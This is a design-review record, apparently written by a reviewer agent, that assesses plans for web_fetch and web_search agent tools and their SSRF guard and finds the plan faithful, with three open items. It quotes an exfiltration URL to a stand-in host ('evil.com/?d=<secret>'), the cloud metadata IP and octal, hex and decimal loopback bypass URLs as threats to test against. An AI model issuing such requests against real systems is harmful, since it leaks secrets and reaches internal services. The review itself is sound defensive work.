---
review: R0-A-on-plan
task_id: P4.2-B4
reviewer: architect-partner (in-family lens)
stage: plan
verdict: needs_architect
scope:
  - docs/process/senior-plans/P4.2-B4.md
  - docs/decisions/ADR-035-network-local-tools.md (Proposed)
  - the ADR-028 D3 amendment + ADR-031 D1a annotation (B4-7, not yet inscribed)
baseline: origin/main (verified working-tree src/tests/config == origin/main; only ADR-035 differs in docs/decisions)
findings:
  - id: Y1
    severity: needs_architect
    title: "web_search provider choice (plan §5-1) — genuine architect routing call; blocks B4-3"
  - id: Y2
    severity: needs_architect
    title: "drift sync-test + _NETWORK_TOOL_NAMES couple the §5-1-blocked web_search into web_fetch's green suite — sequencing hazard"
  - id: Y3
    severity: alpha-absorb
    title: "pinned SSRF test lists omit the IP-literal-encoding bypass class the ADR itself names"
note: R0-B-on-plan.md authored independently in parallel (cross-family); NOT read before this review. Synthesis is the architect's step.
---

# R0-A-on-plan — P4.2-B4 (network local tools: `web_fetch` / `web_search`)

**Posture.** This is the heaviest single trust surface of P4.2 (first agent-chosen-URL tool; SSRF / data-exfil). I verify-cited every file:line in the plan + ADR against `origin/main`, checked faithfulness to the 5 architect-ratified brief decisions, and probed the 7 axes the dispatch named. **No blocking (🔴) findings — the plan + ADR are faithful, cite-accurate, and implementable.** Three 🟡: one genuine architect routing call the senior correctly surfaced (§5-1), one sequencing hazard it introduces, one test-completeness gap.

## Verify-cite integrity (the baseline)

The plan branch leaves `src/`, `tests/`, `config/` **byte-identical to origin/main** (`git diff --name-only origin/main HEAD -- src tests config` → empty; only `ADR-035` is new in `docs/decisions/`). So reading the working tree IS reading origin/main. **Every cite the plan/ADR make verifies:**

| Cite | Verified |
|---|---|
| `executor.py:51` `MAX_SUBPROCESS_CALLS_PER_TURN=10`; `:115` `subprocess_calls_this_turn=0`; `:170-197` self-contained `if _is_posture_b:` branch; `_execute_local_call:343-393` | ✓ exact |
| `subprocess_tools.py:50-64` `_SubprocessToolFn(_is_posture_b_subprocess:ClassVar=True)`; `:96-103` error-class-in-message, structured `error_class` left default | ✓ exact |
| `selection.py:95` `_SUBPROCESS_TOOL_NAMES`; `:106` `_external_output_tool_result_call_ids`; `:127` the `in _SUBPROCESS_TOOL_NAMES` disjunct; docstrings `:106-145` | ✓ exact |
| `tools.yaml:13-16` `web_search`/`web_fetch` reversibility 10 | ✓ exact |
| `ADR-028:65` deferred-tools line (network un-struck, subprocess struck via B3) — the exact strike-through B4-7 mirrors; `:3` top amendments block | ✓ exact |
| `ADR-031 D1a` `RB-FS/NET` residual (env/secret/DoS-only, FS/network deferred P4) | ✓ exact |
| `app.py:240` subprocess merge at the api/ root (the B4-4 mirror); `app.py:454/460` `result_events[-1]` → `current_event_for_pass` | ✓ exact |
| no-SSRF httpx precedents: `mcp/transport.py:110-128`, `plugins/fetch.py:233`, `openai_compatible.py:107` (all `verify=True`, operator-trusted URL, **no SSRF**); `api_key_env` at `llm/types.py:248` + `openai_compatible.py:101-102` | ✓ exact |
| `MAX_RESULT_BYTES=65_536` (64 KiB); `local.py:366` `build_local_tool_registry` has **no** web tools (fail-closed `not_implemented`); `LocalToolError:42`, `_check_path:120` exist; guards `t3b:188` / `t4:232` / subprocess drift-guard `:556` all real | ✓ exact |
| zero pre-existing collisions for `net_trust`/`network_tools`/`_is_network_tool`/`_NETWORK_TOOL_NAMES`/`turn_network_cap_exceeded`/`MAX_NETWORK_CALLS_PER_TURN`/`web_search.yaml` | ✓ clean namespace |

**Cite discipline is exemplary** — including the load-bearing one: `app.py:460` `current_event_for_pass = result_events[-1]` confirms the D3-iii reconcile (the last result-class event is a channel **distinct** from `snapshot_excerpt`), so "excerpt-excluding `web_fetch` does not blind the acting agent when it is the focused/last call" rests on real code, and the "batched-non-last → invisible" known-limitation is the honest, accurate corollary. The central justification — *"no SSRF guard exists to reuse; building it is the new load-bearing work"* — is **true**: all three prior httpx fetches target operator-authoritative URLs with no IP/scheme/rebind validation.

## Faithfulness to the 5 ratified decisions

| Ratified | Plan / ADR | Faithful? |
|---|---|---|
| (1b) both web tools AUTO | D1; tools.yaml rev 10 both; `web_fetch`=SSRF core, `web_search`=fixed-provider | ✓ |
| (2A) app SSRF floor now + honest egress residual; redirects re-validate-each-hop; http+https | D2/D3-i; B4-1 floor + resolve-then-pin + per-hop re-validation; `max_redirects=5`; honest `RB-FS/NET` network half = **active** (vs B3 latent) | ✓ |
| (3-iii) raw TOOL_RESULT + untrusted-framing + extend `_external_output` filter | D3-iii; B4-6 adds `_NETWORK_TOOL_NAMES` disjunct + drift sync-test; no new `LLMPurpose` | ✓ |
| (3-iv) credential-strip; no auth-forward on cross-origin redirect | D3-iv; B4-1 anonymous client (no auth/cookie/env), moot-by-construction on redirect | ✓ |
| (in-proc httpx + `MAX_NETWORK_CALLS_PER_TURN` in loop, empty-executor-diff; ADR-035 + amend ADR-028 D3) | D4; B4-2/B4-5/B4-7; `_execute_local_call` byte-frozen | ✓ |

No re-litigation of ratified calls. ADR-035 stays `Proposed` (RC-23). ADR↔plan constants agree (timeouts 20/15s, `max_redirects=5`, cap 10, http+https).

## The 7 probe axes

- **(i) SSRF floor complete + test-enforced** — ✓ with one gap (Y3). Floor classifies the **resolved** IP via `ipaddress` (loopback/private/link-local incl. `169.254.169.254` / unspecified `0.0.0.0` / multicast / reserved / IPv4-mapped-unwrap), **deny-if-ANY**, scheme allowlist before resolve, resolve-then-pin (validate-then-connect-to-pinned-IP, no re-resolve TOCTOU), per-hop redirect re-validation, and `t10` enforces no-bypass + `verify=False`-forbidden. Cross-origin-redirect-to-non-http and multi-A-record-one-internal are both covered. **Gap: the named IP-literal-encoding class is untested (Y3).**
- **(ii) credential-strip incl. cross-origin redirect** — ✓ clean. Anonymous client carries no auth/cookie/env; redirect auth-leak is moot because nothing is ever sent (B4-1 asserts none is constructed); cookie jar disabled (no Set-Cookie replay).
- **(iii) honest egress/data-exfil residual** — ✓ clean, **not softened**. D2/D3-ii state plainly "we do NOT claim data-exfil is solved"; public-host exfil (`https://evil.com/?d=<secret>`) is the Accepted active `RB-FS/NET` network half; P4.3 (retirement) + operator egress-allowlist + `web_fetch→COUNTDOWN` are all named as the un-built tightening/retirement knobs. The active-vs-latent distinction from B3 is drawn truthfully.
- **(iv) empty-executor-diff** — ✓ clean. `_execute_local_call` (`:343-393`) untouched; the cap is an `elif _is_network:` *beside* the byte-unchanged `if _is_posture_b:` branch; `t3b` (`:188`) is a real guard. Separate from the subprocess cap (no change to B3 semantics).
- **(v) liveness** — ✓ clean. Bounded `WEB_FETCH_TIMEOUT_S=20`/`WEB_SEARCH_TIMEOUT_S=15`, body **streamed-and-bounded** at 64 KiB (not buffered — cites the B3 R0-A Y1 OOM lesson), `max_redirects=5`, per-pass network cap 10 → true bound `10×(1+N)` under the turn-loop. Each is a finite term in the ADR-028 D5 single-writer bound.
- **(vi) web_search provider+key** — ✓ clean (modulo Y1). `api_key_env` is a var **name**; the value is read from `os.environ` at build/call time, only `.example` committed, sent **only** to the fixed provider endpoint in its auth header, **never** onto a fetched URL, never logged; fail-closed `not configured`. Provider **identity** is the genuine open call (Y1/§5-1).
- **(vii) output-untrusted filter + drift sync-test** — ✓ faithful extension (a third disjunct on the existing OR-predicate; sync-test mirrors `:556`), but the *value* `{web_fetch, web_search}` interacts with the §5-1 block (Y2).

## Findings (surface — architect routes; I do not)

**Y1 — `web_search` provider choice (§5-1). 🟡 needs_architect; blocks B4-3.** The senior correctly declined to self-decide this; I concur it is a **genuine architect call** — it commits an external dependency + billing relationship + a config secret + the concrete request/response-parsing shape the junior must code (decision-matrix: "plan needs a design decision not in brief/ADRs"). Senior lean **Brave Search API**; alternatives **Tavily** (opinionated/summarised), **Bing** (Azure-gated), **SerpAPI** (pricier). The config mechanism + fail-closed path are pinned regardless; **B4-3 is the only blocked atomic; the web_fetch chain (B4-1/2/4/5/6/8) is independent.** → **architect routes the provider.**

**Y2 — the drift sync-test couples the blocked `web_search` into `web_fetch`'s green suite. 🟡 needs_architect (sequencing).** B4-6 hard-codes `_NETWORK_TOOL_NAMES = {"web_fetch", "web_search"}` **and** a sync-test asserting `set(build_network_tool_registry(...).keys()) == _NETWORK_TOOL_NAMES`. If the junior is dispatched for the "web_fetch chain unblocked immediately" (the plan's own §3 / expected-next-action language) **while `web_search` is still §5-1-blocked**, the registry holds only `{web_fetch}` ≠ the two-element name set → the sync-test (and the green-suite gate) goes **red**. This is a sequencing hazard, not a defect: it dissolves entirely if **§5-1 is routed *before* dispatch** so the whole slice lands as one green unit (the plan's *primary* expected action). The only alternative, if the architect wants to split, is to authorise the senior to **stage** `_NETWORK_TOOL_NAMES` + its exclusion + the sync-test to **web_fetch-only first**, adding `web_search` in B4-3. → **architect: confirm dispatch sequencing (route §5-1 first — recommended — vs authorise web_fetch-only staging).** Surfacing because the plan's "unblocked immediately" wording invites the breaking path, and "surface-don't-improvise" means the junior should not silently re-sequence.

**Y3 — pinned SSRF test lists omit the IP-literal-encoding bypass class. 🟡 lean α-absorb.** ADR-035 D3-i names the standard checklist — *"IP-literal encodings — octal/hex/decimal; IPv6 + IPv4-mapped; DNS-rebind; redirect; credential-on-redirect"* — and delegates it to R0-B. The plan's pinned test lists (B4-1 floor tests; B4-8 `t10`) cover IPv6, IPv4-mapped, DNS-rebind, redirect, multi-A-record — but **not** the octal/hex/decimal literal class (e.g. `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1/`). The floor's defense here is *indirect*: it relies on the resolver (`getaddrinfo`) normalising the numeric literal to the canonical IP **before** `ipaddress` classification — which is platform/resolver-dependent. **Add an encoded-loopback denial case to the `t10` floor list** to prove the resolve-then-classify path actually normalises-then-denies on the impl's resolver (don't lean solely on R0-B's probe + an assumed resolver behaviour). Cheap; closes a named class with a concrete assertion. → **lean α (absorb into B4-1/B4-8 tests).**

## §5 design-calls assessment (dispatch ask)

- **§5-1 (separate provider routing)** — **genuine architect call → route** (Y1). The senior was right not to self-decide.
- **§5-2 (separate `MAX_NETWORK_CALLS_PER_TURN` vs generalise the subprocess cap)** — senior-pinned **separate**. I **concur, no routing needed.** Verified: the subprocess branch (`:170-197`) is self-contained; a parallel network branch is additive and leaves B3 byte-unchanged. Distinct resource classes (latency-bound connections vs fork-exhaustion) with distinct bounds — one shared counter would let 10 fetches starve `run_tests` and would mutate B3's ratified semantics. Architect may override if they want a single "external call" budget.
- **§5-3 (separate `_NETWORK_TOOL_NAMES` vs one folded set)** — senior-pinned **separate**. I **concur, no routing needed** (three legible trust-class origins + separable drift sync-tests; the predicate just ORs a third disjunct). The *value* coupling is Y2, not the structure.
- **§5-4 (`tools/net_trust.py` location)** — senior-pinned. I **concur, no routing needed.** Verified `subprocess_trust.py` lives at `mcp/`, `subprocess_tools.py` at `tools/`; `net_trust.py` co-located with its sole consumer `network_tools.py` respects t1 (tools/ leaf, no upstream import). A neutral top-level `net/` buys nothing for one consumer in B4. Architect may prefer the neutral home if reuse beyond `tools/` is anticipated.

## Verdict

**`needs_architect`** — the plan + ADR are faithful, cite-accurate (every file:line verified vs origin/main), and sound on all 7 probe axes; the SSRF floor + resolve-then-pin + per-hop re-validation + credential-strip + empty-executor-diff + bounded liveness are correctly designed, and the egress residual is inscribed honestly. No 🔴. The open items for the architect: **route §5-1 (Y1)**; **confirm dispatch sequencing so Y2 cannot bite** (routing §5-1 *before* dispatch resolves both Y1 and Y2 at once — the recommended path); **route Y3 → α** (add the encoded-literal floor test). Then **Accept ADR-035** (Proposed → Accepted; architect-only) and dispatch the junior. Mandatory impl-stage dual-lens R0-B re-probes the SSRF transport implementation. *(R0-B-on-plan.md landed in parallel; cross-family synthesis is the architect's next step.)*
